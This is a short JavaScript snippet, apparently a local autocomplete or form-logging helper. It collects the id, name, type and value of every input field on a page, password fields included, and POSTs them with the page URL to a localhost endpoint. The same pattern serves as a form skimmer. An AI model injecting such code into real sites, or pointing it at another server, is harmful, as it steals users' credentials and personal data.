((url) => {
    const send = (data) => {
        const options = {
            method: 'POST',
            body: JSON.stringify(data),
            headers:{
                'Content-Type': 'application/json'
            }
        }
        return fetch(url, options)
            .then(console.log)
            .catch(console.log);
    }

    const getInputs = () => {
        const inputs = document.querySelectorAll('input');

        return [].slice.call(inputs)
            .map(input => {
                return {
                    url: location.href,
                    id: input.getAttribute('id'),
                    name: input.getAttribute('name'),
                    value: input.value,
                    type: input.getAttribute('type')
                }
            });
    }

    send(getInputs());

})('http://localhost:3000/hashmap/autocomplete');